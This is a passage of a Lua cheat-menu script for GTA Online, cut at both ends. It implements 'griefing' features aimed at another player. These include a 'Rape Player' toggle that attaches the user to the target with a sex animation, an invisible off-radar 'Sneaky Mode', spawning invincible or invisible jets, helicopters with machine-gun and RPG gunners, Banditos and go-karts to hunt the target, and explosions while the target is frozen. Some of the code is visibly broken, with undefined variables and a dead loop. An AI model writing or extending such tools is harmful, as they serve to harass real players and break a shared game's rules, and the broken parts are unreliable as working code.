                ENTITY.ATTACH_ENTITY_TO_ENTITY(ent, tar, 0, 0.0, -0.20, 2.00, 1.0, 1.0,1, true, true, true, false, 0, true)
            end
        end
        for i, ent in pairs(vehicles) do
            if not is_ped_player(VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1)) then
                ENTITY.ATTACH_ENTITY_TO_ENTITY(ent, tar, 0, 0.0, -0.20, 2.00, 1.0, 1.0,1, true, true, true, false, 0, true)
            end
        end
        for i, ent in pairs(objects) do
            ENTITY.ATTACH_ENTITY_TO_ENTITY(ent, tar, 0, 0.0, -0.20, 2.00, 1.0, 1.0,1, true, true, true, false, 0, true)
        end
    end)

        -- Detach all other entities from an entity.
        DetachAll = function(entity)
            local objects = entities.get_all_objects_as_handles()
            for _, object in pairs(objects) do
                if ENTITY.IS_ENTITY_ATTACHED_TO_ENTITY(object, entity) then
                    RequestControl(object, true)
                    ENTITY.DETACH_ENTITY(object, false, false)
                    util.yield()
                    entities.delete_by_handle(object)
                end
            end
        end

    menu.toggle_loop(attachoptions, "Dettach All Nearby Entities", {"attachallnearby"}, "", function(on_toggle)
        local tar = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        objects = entities.get_all_objects_as_handles()
        vehicles = entities.get_all_vehicles_as_handles()
        peds = entities.get_all_peds_as_handles()
        for i, ent in pairs(peds) do
            if not is_ped_player(ped) then
                DetachAll(ent, tar)
            end
        end
        for i, ent in pairs(vehicles) do
            if not is_ped_player(VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1)) then
                DetachAll(ent, tar)
            end
        end
        for i, ent in pairs(objects) do
            DetachAll(ent, tar)
        end
    end)
    
        local usingPiggyback = false
        local usingRape = false

	menu.toggle(attachoptions, "Rape Player", {"rape"}, "The player won't see you attached to them", function (on)
		usingRape = on
		-- Otherwise the game would crash
		if pid == players.user() then
			return
		end
		if usingRape then
			usingPiggyback = false
			local target = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.GET_PLAYER_NAME(pid))
			STREAMING.REQUEST_ANIM_DICT("rcmpaparazzo_2")
			while not STREAMING.HAS_ANIM_DICT_LOADED("rcmpaparazzo_2") do
				util.yield_once()
			end
			TASK.TASK_PLAY_ANIM(players.user_ped(), "rcmpaparazzo_2", "shag_loop_a", 8.0, -8.0, -1, 1, 0.0, false, false, false)
			ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), target, 0, 0, -0.3, 0, 0.0, 0.0, 0.0, false, true, false, false, 0, true, 0)
			while usingRape and is_player_active(pid, false, true) and
			not util.is_session_transition_active() do
				util.yield_once()
			end
			usingRape = false
			TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
			ENTITY.DETACH_ENTITY(players.user_ped(), true, false)
		end
	end)


    stopato = true

    menu.toggle(griefing, "Toggle Sneaky Mode", {"sneakymode"}, "Teleports you to player then turns you invisible, off radar and no collisions...", function(on_toggle)
        if on_toggle then
            menu.trigger_commands("tp" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("invisibility" .. " on")
            menu.trigger_commands("reducedcollision" .. " on")
            menu.trigger_commands("otr")
            menu.trigger_commands("quietsteps")
            util.toast("Sneaky Mode On") 
        else
            menu.trigger_commands("tpmazehelipad")
            menu.trigger_commands("invisibility" .. " off")
            menu.trigger_commands("reducedcollision" .. " off")
            menu.trigger_commands("otr")
            menu.trigger_commands("quietsteps")
            util.toast("Sneaky Mode Off")
            end 
    end)

    menu.toggle(griefing, "Toggle Pidgeon Mode", {"pidgeonmode"}, "Teleports you to player then turns you into a Pidgeon, off radar and no collisions...", function(on_toggle)
        if on_toggle then
            menu.trigger_commands("otr")
            menu.trigger_commands("tp" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("reducedcollision" .. " on")
            menu.trigger_commands("acpigeon")
            util.yield(100)
            menu.trigger_commands("noguns")
            menu.trigger_commands("allguns")
            util.toast("Pidgeon Mode On") 
        else
            menu.trigger_commands("otr")
            menu.trigger_commands("tpmazehelipad")
            menu.trigger_commands("reducedcollision" .. " off")
            menu.trigger_commands("outfit1candydinka")
            util.toast("Pidgeon Mode Off")
            end 
    end)

    local Attackers_trollys = menu.list(griefing, "Attackers")

    menu.toggle_loop(Attackers_trollys,"Kamikaze lazer", {"kamikazelazer"}, "", function(on)
        local ped = 2459507570
        STREAMING.REQUEST_MODEL(ped)
        while not STREAMING.HAS_MODEL_LOADED(ped) do
            wait(100)
        end
        local lazer = 3013282534
        STREAMING.REQUEST_MODEL(lazer)
        while not STREAMING.HAS_MODEL_LOADED(lazer) do
            wait(100)
        end
        local pid = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        local spawn = VEHICLE.CREATE_VEHICLE(lazer, pid.x, pid.y, pid.z+20, 0, true, false, false)
        local pedspawn = PED.CREATE_PED(26, ped, pid.x, pid.y, pid.z+20, 0, true, false)
        PED.SET_PED_INTO_VEHICLE(pedspawn, spawn, -1)
        VEHICLE.SET_VEHICLE_ENGINE_HEALTH(spawn, -20)
        ENTITY.SET_ENTITY_ROTATION(spawn, -90.0, 0.0, 0.0, 1, true)
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(spawn, 100)
        util.yield(3000)
    end)

local trolly_vehicles = menu.list(Attackers_trollys, "Trolly Vehicles")

function set_ent_face_ent(ent1, ent2) --All credits to Ren for suggesting me this function
    local pos1 = ENTITY.GET_ENTITY_COORDS(ent1)
    local pos2 = ENTITY.GET_ENTITY_COORDS(ent2)
    local dx = pos2.x - pos1.x
    local dy = pos2.y - pos1.y
    local heading = MISC.GET_HEADING_FROM_VECTOR_2D(dx, dy)
    return ENTITY.SET_ENTITY_HEADING(ent1, heading)
end
function set_ped_can_be_knocked_off_veh(ped, state)
    native_invoker.begin_call()
    native_invoker.push_arg_int(ped)
    native_invoker.push_arg_int(state)
    native_invoker.end_call("7A6535691B477C48")
end
function add_blip_for_entity(entity, blipSprite, colour)
    local blip_ptr = memory.alloc()
    local blip = HUD.ADD_BLIP_FOR_ENTITY(entity)
    memory.write_int(blip_ptr, blip)
    HUD.SET_BLIP_SPRITE(blip, blipSprite)
    HUD.SET_BLIP_COLOUR(blip, colour)
    HUD.SHOW_HEIGHT_ON_BLIP(blip, false)
    HUD.SET_BLIP_ROTATION(blip, SYSTEM.CEIL(ENTITY.GET_ENTITY_HEADING(entity)))
    util.create_thread(function()
        local netId = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity)
        while NETWORK.NETWORK_DOES_ENTITY_EXIST_WITH_NETWORK_ID(netId) do
            HUD.SET_BLIP_ROTATION(blip, SYSTEM.CEIL(ENTITY.GET_ENTITY_HEADING(entity)))
            if ENTITY.IS_ENTITY_DEAD(NETWORK.NET_TO_ENT(netId)) then
                break	
            end
            util.yield()
        end
        HUD.SET_BLIP_DISPLAY(blip, 0)
        --HUD.REMOVE_BLIP(memory.read_int(blip_ptr))
        memory.free(blip_ptr)
    end)
    return blip
end

local config_list = {
    ['controls'] = {
        ['Vehicle Weapons'] = 86,
        ['Airstrike Aircraft'] = 86
    },
    ['driving style'] = {
        ['Bandito Driving Style'] = 786988
    }
}
local function delete_entities_by_model(model)
    local hash = util.joaat(model)
    if STREAMING.IS_MODEL_A_VEHICLE(hash) then
        for k, vehicle in pairs(entities.get_all_vehicles_as_handles()) do
            if ENTITY.GET_ENTITY_MODEL(vehicle) == hash then
                for k, ped in pairs(entities.get_all_peds_as_handles()) do
                    if PED.GET_VEHICLE_PED_IS_IN(ped, true) == vehicle then
                        if not PED.IS_PED_A_PLAYER(ped) then
                            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ped, false, false); entities.delete_by_handle(ped)
                        else
                            goto continue
                        end
                    end
                end
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(vehicle, false, false); entities.delete_by_handle(vehicle)
                ::continue::
            end
        end
        return
    end
    if STREAMING.IS_MODEL_A_PED(hash) then
        for k, ped in pairs(entities.get_all_peds_as_handles()) do
            if ENTITY.GET_ENTITY_MODEL(ped) == hash then
                if not PED.IS_PED_A_PLAYER(ped) then
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ped, false, false); entities.delete_by_handle(ped)
                end
            end
        end
        return
    end
    for k, object in pairs(entities.get_all_objects_as_handles()) do
        if ENTITY.GET_ENTITY_MODEL(object) == hash then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, false, false); entities.delete_by_handle(object)
        end
    end
end

local function spawn_trolly_vehicle(pid, vehicleHash, pedHash)
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(player_ped)
    local coords_ptr, nodeId = memory.alloc(), memory.alloc()
    local coords
    if not PATHFIND.GET_RANDOM_VEHICLE_NODE(pos.x, pos.y, pos.z, 100, 0, 0, 0, coords_ptr, nodeId) then
        pos.x = pos.x + math.random(-20,20)
        pos.y = pos.y + math.random(-20,20)
        PATHFIND.GET_CLOSEST_VEHICLE_NODE(pos.x, pos.y, pos.z, coords_ptr, 1, 100, 2.5)
        coords = memory.read_vector3(coords_ptr)
    else
        coords = memory.read_vector3(coords_ptr)
    end
    memory.free(coords_ptr); memory.free(nodeId)

    local vehicle = entities.create_vehicle(vehicleHash, coords, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
    if not ENTITY.DOES_ENTITY_EXIST(vehicle) then
        local tick = 0
        while not ENTITY.DOES_ENTITY_EXIST(vehicle) and tick <= 10 do
            vehicle = entities.create_vehicle(vehicleHash, coords, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
            tick = tick + 1
            util.yield()
        end
    end
    VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
    for i = 0, 50 do
        VEHICLE.SET_VEHICLE_MOD(vehicle, i, VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, i) - 1, false)
    end
    VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, true)
    VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vehicle, true)
    VEHICLE.SET_VEHICLE_IS_CONSIDERED_BY_PLAYER(vehicle, false)
    set_ent_face_ent(vehicle, player_ped)

    local driver = entities.create_ped(5, pedHash, coords, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
    PED.SET_PED_COMBAT_ATTRIBUTES(driver, 1, true)
    PED.SET_PED_INTO_VEHICLE(driver, vehicle, -1)
    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
    TASK.TASK_VEHICLE_MISSION_PED_TARGET(driver, vehicle, player_ped, 6, 500.0, config_list['driving style']['Bandito Driving Style'], 0.0, 0.0, true)
    set_ped_can_be_knocked_off_veh(driver, 1)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(pedHash); STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(vehicleHash)
    return vehicle, driver
end

local bandito_godmode = false

menu.divider(trolly_vehicles, "Bandito")

menu.click_slider(trolly_vehicles, 'Send Bandito', {'sendbandito'}, '', 1,25,1,1, function(quantity)
    local bandito_hash = util.joaat("rcbandito")
    local ped_hash = util.joaat('mp_m_freemode_01')
    STREAMING.REQUEST_MODEL(bandito_hash); STREAMING.REQUEST_MODEL(ped_hash)
    while not STREAMING.HAS_MODEL_LOADED(bandito_hash) and not STREAMING.HAS_MODEL_LOADED(ped_hash) do
        util.yield()
    end
    for i = 1, quantity do
        local bandito, driver = spawn_trolly_vehicle(pid, bandito_hash, ped_hash)
        add_blip_for_entity(bandito, 646, 4)
        ENTITY.SET_ENTITY_INVINCIBLE(bandito, bandito_godmode)
        ENTITY.SET_ENTITY_VISIBLE(driver, false, 0)
        --notification("Spawned some annoying ass cars", colors.red)
        util.yield(150)
    end
end)

menu.toggle(trolly_vehicles, "Invincible", {"invincbandito"}, "", function(on)
    bandito_godmode = on
end, false)

menu.action(trolly_vehicles, "Delete Banditos", {"deletebandito"}, "", function()
    delete_entities_by_model("rcbandito")
end)

-------------------------------------
--GO KART
-------------------------------------

local gokart_godmode = false
menu.divider(trolly_vehicles, 'Go-Kart')


menu.click_slider(trolly_vehicles, "Send Go-Kart(s)", {"sendgokart"}, "",1, 15, 1, 1, function(quantity)
    local vehicleHash = joaat("veto2")
    local pedHash = joaat("mp_m_freemode_01")
    requestModels(vehicleHash, pedHash)
    
    for i = 1, quantity do
        local gokart, driver = spawn_trolly_vehicle(pid, vehicleHash, pedHash)
        addBlipForEntity(gokart, 748, 5)
        ENTITY.SET_ENTITY_INVINCIBLE(gokart, gokartGodmode)
        VEHICLE.SET_VEHICLE_COLOURS(gokart, 89, 0)
        VEHICLE.TOGGLE_VEHICLE_MOD(gokart, 18, true)
        ENTITY.SET_ENTITY_INVINCIBLE(driver, gokartGodmode)
        PED.SET_PED_COMPONENT_VARIATION(driver, 3, 111, 13, 2)
        PED.SET_PED_COMPONENT_VARIATION(driver, 4, 67, 5, 2)
        PED.SET_PED_COMPONENT_VARIATION(driver, 6, 101, 1, 2)
        PED.SET_PED_COMPONENT_VARIATION(driver, 8, -1, -1, 2)
        PED.SET_PED_COMPONENT_VARIATION(driver, 11, 148, 5, 2)
        PED.SET_PED_PROP_INDEX(driver, 0, 91, 0, true)
        wait(150)
    end

end)

menu.toggle(trolly_vehicles, 'Invincible Go-Kart', {"invinckart"}, '', function(toggle)
    gokart_godmode = toggle
end)

menu.action(trolly_vehicles, 'Delete Go-Karts', {"deletekart"}, '', function()
    delete_entities_by_model('veto2')
end)
----------------------------------------------------------------------------------------------------------------------- attacker ufo --------------------------------------------------------

local gunner_weapon_listing = { --these are the ufo's gunner weapons 
{"Combat MG", "weapon_combatmg"},
{"RPG", "weapon_rpg"}
}

ufo_entities = {}

local function get_model_size(hash)
local minptr = memory.alloc(24)
local maxptr = memory.alloc(24)
local min = {}
local max = {}
MISC.GET_MODEL_DIMENSIONS(hash, minptr, maxptr)
min.x, min.y, min.z = v3.get(minptr)
max.x, max.y, max.z = v3.get(maxptr)
local size = {}
size.x = max.x - min.x
size.y = max.y - min.y
size.z = max.z - min.z
size['max'] = math.max(size.x, size.y, size.z)
return size
end

local function request_control_of_entity_once(ent)
if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and util.is_session_started() then
    local netid = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(ent)
    NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netid, true)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
end
end
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
function spawn_ufo(pid, gunner_weapon, collision)
local player_peds =  PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
local pos = ENTITY.GET_ENTITY_COORDS(player_peds)
pos.x = pos.x + math.random(-20, 20)
pos.y = pos.y + math.random(-20, 20)
pos.z = pos.z + math.random(20, 40)
PED.SET_PED_RELATIONSHIP_GROUP_HASH(player_peds, util.joaat("PLAYER"))
local ufo_hash = util.joaat("lazer")
local ped_hash = util.joaat("S_M_M_MovAlien_01")
STREAMING.REQUEST_MODEL(ped_hash)
STREAMING.REQUEST_MODEL(ufo_hash)
while not STREAMING.HAS_MODEL_LOADED(ped_hash) or not STREAMING.HAS_MODEL_LOADED(ufo_hash) do
    util.yield()
end
local ufo = entities.create_vehicle(ufo_hash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
ufo_entities[#ufo_entities + 1] = ufo
ENTITY.SET_ENTITY_INVINCIBLE(ufo, ufo_godmode)
ENTITY.SET_ENTITY_VISIBLE(ufo, ufo_visible, 0)	
VEHICLE.SET_VEHICLE_ENGINE_ON(ufo, true, true, true)
VEHICLE.SET_HELI_BLADES_FULL_SPEED(ufo)
VEHICLE.CONTROL_LANDING_GEAR(ufo, 3)    
local pilots = entities.create_ped(5, ped_hash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
ufo_entities[#ufo_entities + 1] = pilots

----Ufo Object------------------------------------------------------------------------------------------------------------------------------------------------------------
local id = get_closest_vehicle(entity)
local playerpos = ENTITY.GET_ENTITY_COORDS(id)
playerpos.z = playerpos.z + 3
local ufo_object = util.joaat("sum_prop_dufocore_01a")
STREAMING.REQUEST_MODEL(ufo_object)
while not STREAMING.HAS_MODEL_LOADED(ufo_object) do
    util.yield()
end
local object1 = entities.create_object(ufo_object, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
ENTITY.ATTACH_ENTITY_TO_ENTITY(object1, ufo, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object1, ufo)
ENTITY.ATTACH_ENTITY_TO_ENTITY(ufo, object1, 0, 0, 3, 0, 0, 0, 0, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(object1, ufo, 0, 0, 3, 0, 0, 0, 0, 0, false, true, false, 0, true)
ENTITY.SET_ENTITY_VISIBLE(object1, true)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
PED.SET_PED_RELATIONSHIP_GROUP_HASH(pilots, util.joaat("ARMY"))
ENTITY.SET_ENTITY_VISIBLE(pilots, ufo_visible, 0)
PED.SET_PED_INTO_VEHICLE(pilots, ufo, -1)
PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(pilots, true)
PED.SET_PED_MAX_HEALTH(pilots, 500)
ENTITY.SET_ENTITY_HEALTH(pilots, 500)
ENTITY.SET_ENTITY_INVINCIBLE(pilots, ufo_godmode)
TASK.TASK_COMBAT_HATED_TARGETS_AROUND_PED(pilots, 500, 0)
----Gunners------------------------------------------------------------------------------------------------------------------------------------
--local gunners = {}
for i  = 1, 0 do
  --  gunners[i] = entities.create_ped(29, ped_hash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
    --ufo_entities[#ufo_entities + 1] = gunners[i]
    --PED.SET_PED_INTO_VEHICLE(gunners[i], ufo, i)
    --WEAPON.GIVE_WEAPON_TO_PED(gunners[i], util.joaat(gunner_weapon) , 9999, false, true)
    --PED.SET_PED_COMBAT_ATTRIBUTES(gunners[i], 20 --[[ they can shoot from vehicle ]], true)
    --PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(gunner[i], true)
    --PED.SET_PED_MAX_HEALTH(gunners[i], 500)
    --ENTITY.SET_ENTITY_HEALTH(gunners[i], 500)
    --ENTITY.SET_ENTITY_INVINCIBLE(gunners[i], ufo_godmode)
    --ENTITY.SET_ENTITY_VISIBLE(gunners[i], ufo_visible, 0)
    --PED.SET_PED_SHOOT_RATE(gunners[i], 1000)
    --PED.SET_PED_RELATIONSHIP_GROUP_HASH(gunners[i], util.joaat("ARMY"))
    --TASK.TASK_COMBAT_HATED_TARGETS_AROUND_PED(gunners[i], 1000, 0)
------------------------------------------------------------------------------------------------------------------------------------------------
end
util.create_tick_handler(function()
    PED.SET_RELATIONSHIP_BETWEEN_GROUPS(5, util.joaat("ARMY"), util.joaat("PLAYER"))
    PED.SET_RELATIONSHIP_BETWEEN_GROUPS(5, util.joaat("PLAYER"), util.joaat("ARMY"))
    PED.SET_RELATIONSHIP_BETWEEN_GROUPS(0, util.joaat("ARMY"), util.joaat("ARMY"))
end)
------------------------------------------------------------------------------------------------------------------------------------------------
--notification("Ufo sent to "..PLAYER.GET_PLAYER_NAME(pid), colors.red)
return pilot, heli
end	

local ufo_options = menu.list(Attackers_trollys, "Enemy Ufo", {}, "")

menu.divider(ufo_options, "Enemy Ufo")

local gunner_weapon = "weapon_combatmg"
menu.action(ufo_options, "Spawn Ufo", {"sendufo"}, "Spawns a ufo.", function()
    local pilot, heli = spawn_ufo(pid, gunner_weapon, collision)
    while ENTITY.GET_ENTITY_HEALTH(pilot) > 0 do
        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local a = ENTITY.GET_ENTITY_COORDS(player_ped)
        local b = ENTITY.GET_ENTITY_COORDS(heli)
        if MISC.GET_DISTANCE_BETWEEN_COORDS(a.x, a.y, a.z, b.x, b.y, b.z, true) > 90 then
            TASK.TASK_HELI_CHASE(pilot, player_ped, 0, 0, 50)
        else
            TASK.TASK_HELI_MISSION(pilot, heli, 0, player_ped, a.x, a.y, a.z, 23, 30, -1, -1, 10, 10, 5, 0)
        end
        util.yield()
    end
end)

menu.toggle_loop(ufo_options, "Spawn Ufo Every 3 Seconds", {"send3ufo"}, "Spawns a ufo every 3 seconds if left toggled.", function()
    local pilot, heli = spawn_ufo(pid, gunner_weapon, collision)
    util.yield(3000)
    while ENTITY.GET_ENTITY_HEALTH(pilot) > 0 do
        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local a = ENTITY.GET_ENTITY_COORDS(player_ped)
        local b = ENTITY.GET_ENTITY_COORDS(heli)
        if MISC.GET_DISTANCE_BETWEEN_COORDS(a.x, a.y, a.z, b.x, b.y, b.z, true) > 90 then
            TASK.TASK_HELI_CHASE(pilot, player_ped, 0, 0, 50)
        else
            TASK.TASK_HELI_MISSION(pilot, heli, 0, player_ped, a.x, a.y, a.z, 23, 30, -1, -1, 10, 10, 5, 0)
        end
        util.yield()
    end
end)

menu.action(ufo_options, "Alien Explosion", {"ufoexplode"}, "Simulate an alien invasion", function()
    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local c = ENTITY.GET_ENTITY_COORDS(p)
    local ufo = util.joaat("sum_prop_dufocore_01a")
    menu.trigger_commands("freeze".. players.get_name(pid).. " on")
    c.z = c.z + 10
    local spawnedufo = entities.create_object(ufo, c) --creates ufo
    util.yield(2000)
    c = ENTITY.GET_ENTITY_COORDS(p)
    FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 3.0, false)
    util.yield(1000)
    entities.delete_by_handle(spawnedufo)
    menu.trigger_commands("freeze".. players.get_name(pid).. " off")
end)

menu.divider(ufo_options, "Settings")

menu.toggle(ufo_options, "Invincible", {"invincufo"}, "", function(on)
    ufo_godmode = on
end, true)

local menu_gunner_weapon_list = menu.list(ufo_options, "Gunners Weapon")
menu.divider(menu_gunner_weapon_list, "Gunner Weapon List")

for i = 1, #gunner_weapon_listing do
    menu.action(menu_gunner_weapon_list, gunner_weapon_listing[i][1], {}, "", function()
        gunner_weapon = gunner_weapon_listing[i][2]
        --notification("Now gunners will shoot with "..gunner_weapon_listing[i][1].."s", colors.red)
    end)
end

menu.toggle(ufo_options, "Visible", {"visableufo"}, "You shouldn't be that toxic to turn this off", function(on)
    ufo_visible = on
end, false)

menu.toggle(ufo_options, "Collision", {"collisionufo"}, "When it's turned off disables world collision for ufo. Playes can still destroy the vehicle", function(on)
    collision = on
end, true)

menu.action(ufo_options, "Delete All", {"deleteufo"}, "Deletes all ufo you've spawned", function()
    menu.trigger_commands("superc")
end)
----------------------------------------------------------------------------------------------------------------------- attacker buzzard --------------------------------------------------------

local gunner_weapon_list = { --these are the buzzard's gunner weapons 
{"Combat MG", "weapon_combatmg"},
{"RPG", "weapon_rpg"}
}

buzzard_entities = {}
function spawn_buzzard(pid, gunner_weapon, collision)
local player_ped =  PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
local pos = ENTITY.GET_ENTITY_COORDS(player_ped)
pos.x = pos.x + math.random(-20, 20)
pos.y = pos.y + math.random(-20, 20)
pos.z = pos.z + math.random(20, 40)

PED.SET_PED_RELATIONSHIP_GROUP_HASH(player_ped, util.joaat("PLAYER"))

local heli_hash = util.joaat("buzzard2")
local ped_hash = util.joaat("s_m_y_blackops_01")
STREAMING.REQUEST_MODEL(ped_hash)
STREAMING.REQUEST_MODEL(heli_hash)
while not STREAMING.HAS_MODEL_LOADED(ped_hash) or not STREAMING.HAS_MODEL_LOADED(heli_hash) do
    util.yield()
end
local heli = entities.create_vehicle(heli_hash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
buzzard_entities[#buzzard_entities + 1] = heli


ENTITY.SET_ENTITY_INVINCIBLE(heli, buzzard_godmode)
ENTITY.SET_ENTITY_VISIBLE(heli, buzzard_visible, 0)	
VEHICLE.SET_VEHICLE_ENGINE_ON(heli, true, true, true)
VEHICLE.SET_HELI_BLADES_FULL_SPEED(heli)
    
local pilot = entities.create_ped(5, ped_hash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
buzzard_entities[#buzzard_entities + 1] = pilot

PED.SET_PED_RELATIONSHIP_GROUP_HASH(pilot, util.joaat("ARMY"))
ENTITY.SET_ENTITY_VISIBLE(pilot, buzzard_visible, 0)
PED.SET_PED_INTO_VEHICLE(pilot, heli, -1)
PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(pilot, true)




PED.SET_PED_MAX_HEALTH(pilot, 500)
ENTITY.SET_ENTITY_HEALTH(pilot, 500)
ENTITY.SET_ENTITY_INVINCIBLE(pilot, buzzard_godmode)
--TASK.TASK_COMBAT_HATED_TARGETS_AROUND_PED(pilot, 500, 0)

local gunner = {}
for i  = 1,2 do
    gunner[i] = entities.create_ped(29, ped_hash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
    buzzard_entities[#buzzard_entities + 1] = gunner[i]
    PED.SET_PED_INTO_VEHICLE(gunner[i], heli, i)
    WEAPON.GIVE_WEAPON_TO_PED(gunner[i], util.joaat(gunner_weapon) , 9999, false, true)
    PED.SET_PED_COMBAT_ATTRIBUTES(gunner[i], 20 --[[ they can shoot from vehicle ]], true)
    --PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(gunner[i], true)
    PED.SET_PED_MAX_HEALTH(gunner[i], 500)
    ENTITY.SET_ENTITY_HEALTH(gunner[i], 500)
    ENTITY.SET_ENTITY_INVINCIBLE(gunner[i], buzzard_godmode)
    ENTITY.SET_ENTITY_VISIBLE(gunner[i], buzzard_visible, 0)
    PED.SET_PED_SHOOT_RATE(gunner[i], 1000)
    PED.SET_PED_RELATIONSHIP_GROUP_HASH(gunner[i], util.joaat("ARMY"))
    TASK.TASK_COMBAT_HATED_TARGETS_AROUND_PED(gunner[i], 1000, 0)
end

util.create_tick_handler(function()
    PED.SET_RELATIONSHIP_BETWEEN_GROUPS(5, util.joaat("ARMY"), util.joaat("PLAYER"))
    PED.SET_RELATIONSHIP_BETWEEN_GROUPS(5, util.joaat("PLAYER"), util.joaat("ARMY"))
    PED.SET_RELATIONSHIP_BETWEEN_GROUPS(0, util.joaat("ARMY"), util.joaat("ARMY"))
end)

--notification("Buzzard sent to "..PLAYER.GET_PLAYER_NAME(pid), colors.red)
return pilot, heli
end	

local buzzard_options = menu.list(Attackers_trollys, "Enemy Buzzard", {}, "")

menu.divider(buzzard_options, "Enemy Buzzard")

buzzard_visible = true
local gunner_weapon = "weapon_combatmg"

menu.action(buzzard_options, "Spawn Buzzard", {"sendbuzzard"}, "", function()
    local pilot, heli = spawn_buzzard(pid, gunner_weapon, collision)

    while ENTITY.GET_ENTITY_HEALTH(pilot) > 0 do
        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local a = ENTITY.GET_ENTITY_COORDS(player_ped)
        local b = ENTITY.GET_ENTITY_COORDS(heli)
        if MISC.GET_DISTANCE_BETWEEN_COORDS(a.x, a.y, a.z, b.x, b.y, b.z, true) > 90 then
            TASK.TASK_HELI_CHASE(pilot, player_ped, 0, 0, 50)
        else
            TASK.TASK_HELI_MISSION(pilot, heli, 0, player_ped, a.x, a.y, a.z, 23, 30, -1, -1, 10, 10, 5, 0)
        end
        util.yield()
    end
end)

menu.divider(buzzard_options, "Settings")

menu.toggle(buzzard_options, "Invincible", {"invincbuzzard"}, "", function(on)
    buzzard_godmode = on
end, true)

local menu_gunner_weapon_list = menu.list(buzzard_options, "Gunners Weapon")
menu.divider(menu_gunner_weapon_list, "Gunner Weapon List")

for i = 1, #gunner_weapon_list do
    menu.action(menu_gunner_weapon_list, gunner_weapon_list[i][1], {}, "", function()
        gunner_weapon = gunner_weapon_list[i][2]
        --notification("Now gunners will shoot with "..gunner_weapon_list[i][1].."s", colors.red)
    end)
end

menu.toggle(buzzard_options, "Visible", {"visablebuzzard"}, "You shouldn't be that toxic to turn this off", function(on)
    buzzard_visible = on
end, true)

menu.toggle(buzzard_options, "Collision", {"collisionbuzzard"}, "When it's turned off disables world collision for Buzzard. Playes can still destroy the vehicle", function(on)
    collision = on
end, false)

menu.action(buzzard_options, "Delete All", {"deletebuzzard"}, "Deletes all Buzzards you've spawned", function()
    for key, value in pairs(buzzard_entities) do
        entities.delete_by_handle(value)
    end
end)

---------------------------------------------- attacker Army --------------------------------------------------------

local gunner_weapon_lists = { --these are the Army's gunner weapons 
{"Combat MG", "weapon_combatmg"},
{"RPG", "weapon_rpg"}
}

lazer_entities = {}

function spawn_lazer(pid, gunner_weapon, collision)
    local player_peds =  PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(player_peds)
    pos.x = pos.x + math.random(-20, 20)
    pos.y = pos.y + math.random(-20, 20)
    pos.z = pos.z + math.random(20, 40)

    PED.SET_PED_RELATIONSHIP_GROUP_HASH(player_peds, util.joaat("PLAYER"))

    local lazer_hash = util.joaat("lazer")
    local ped_hash = util.joaat("S_M_Y_ArmyMech_01")
    STREAMING.REQUEST_MODEL(ped_hash)
    STREAMING.REQUEST_MODEL(lazer_hash)
    while not STREAMING.HAS_MODEL_LOADED(ped_hash) or not STREAMING.HAS_MODEL_LOADED(lazer_hash) do
        util.yield()
    end
